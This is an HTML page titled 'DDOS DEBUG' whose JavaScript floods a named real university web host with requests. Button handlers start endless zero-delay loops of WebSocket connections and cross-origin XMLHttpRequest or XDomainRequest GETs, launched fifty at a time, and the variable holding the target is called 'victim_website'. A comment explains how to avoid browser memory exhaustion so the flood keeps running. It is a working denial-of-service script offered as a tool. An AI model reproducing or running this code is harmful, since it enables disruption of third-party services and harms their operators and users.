<html>
<head>
  <title>DDOS DEBUG</title>
</head>

<body>
    <input type="submit" value="WebSocket" style="margin-left:10px" onclick="while_loop_ws()" /> 
	<input type="submit" value=" C O R " style="margin-left:10px" onclick="do_it()" />
	<div id="result"></div>
  
  <script type="text/javascript">
  //<![CDATA[
    var scan_counter = 0;
    var victim_website = "cspo.zju.edu.cn";//"www.cs.zju.edu.cn";
	
	var Sys = {};
	var ua = navigator.userAgent.toLowerCase();
	var s;
	(s = ua.match(/msie ([\d.]+)/)) ? Sys.ie = s[1] : 0;
    if (!Sys.ie)
    {
		var xhr = new XMLHttpRequest();
	}
	else
	{
		var xdr = new XDomainRequest();
		xdr.onerror = err;
        xdr.ontimeout = timeo;
        xdr.onprogress = progres;
        xdr.onload = loadd;
		xdr.timeout = 1000;
	}
	function err()
    {
        alert("XDR onerror");
    }
    function timeo()
    {
        alert("XDR ontimeout");
    }
    function loadd()
    {
        alert("XDR onload");
        alert("Got: " + xdr.responseText);
    }
    function progres()
    {
        alert("XDR onprogress");
        alert("Got: " + xdr.responseText);
    }
	
    function while_loop_ws()
    {
        try
        {
            ws = new WebSocket("ws://" + victim_website + ":80");
            scan_counter = scan_counter+1;
            setTimeout("while_loop_ws()",0);
        }
        catch(err)
        {
            document.getElementById('result').innerHTML += "<b>Scan stopped. Exception: " + err + "<\/b>";
            return;
        }
        document.getElementById('result').innerHTML = "<b>Current counter: " + scan_counter + "<\/b>";
    }
    function while_loop_cor()
    {
        try
        {
            xhr.abort();//解决内存耗费的关键在这里。
            scan_counter = scan_counter+1;
            xhr = new XMLHttpRequest();
            xhr.open('GET', "http://" + victim_website + ":80");
            xhr.send();             
  
            setTimeout("while_loop_cor()",0);
        }
        catch(err)
        {
            document.getElementById('result').innerHTML += "<b>Scan stopped. Exception: " + err + "<\/b>";
            return;
        }
        document.getElementById('result').innerHTML = "<b>Current counter: " + scan_counter + "<\/b>";
    }
	function while_loop_ie()
	{
		try
		{
			xdr.abort();
			scan_counter = scan_counter+1;
			xdr = new XDomainRequest();
			xdr.open('get', "http://" + victim_website + ":80");
			xdr.send();
			
			setTimeout("while_loop_ie()",0);
		}
		catch(err)
        {
            document.getElementById('result').innerHTML += "<b>Scan stopped. Exception: " + err + "<\/b>";
            return;
        }
        document.getElementById('result').innerHTML = "<b>Current counter: " + scan_counter + "<\/b>";
    }
    function do_it()
    {
		if (!Sys.ie)
        {
			var i = 0;
			while(i<50)
			{
				while_loop_cor();
				i++;
			}
        }
		else
		{
			var i = 0;
            while(i<50)
            {
				while_loop_ie();
				i++;
			}
		}
    }
  //]]>
  </script>
</body>
</html>
